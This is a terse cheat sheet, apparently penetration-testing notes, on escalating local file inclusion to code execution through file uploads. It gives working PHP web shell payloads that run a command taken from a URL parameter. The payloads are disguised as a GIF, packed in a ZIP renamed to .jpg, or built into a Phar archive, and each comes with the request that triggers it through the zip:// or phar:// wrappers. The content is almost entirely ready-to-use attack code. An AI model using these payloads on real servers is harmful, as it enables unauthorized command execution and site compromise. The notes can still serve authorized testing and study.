Execute functions:
PHP: include() / include_once(), require() / require_once()
NodeJS: res.render()
Java: import
.NET: include

## Image Uploads
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- Upload it, and take note of uploaded path
```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## ZIP Upload
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
- Works if allows ZIP uploads

```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
- zip wrapper

## Phar Upload
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

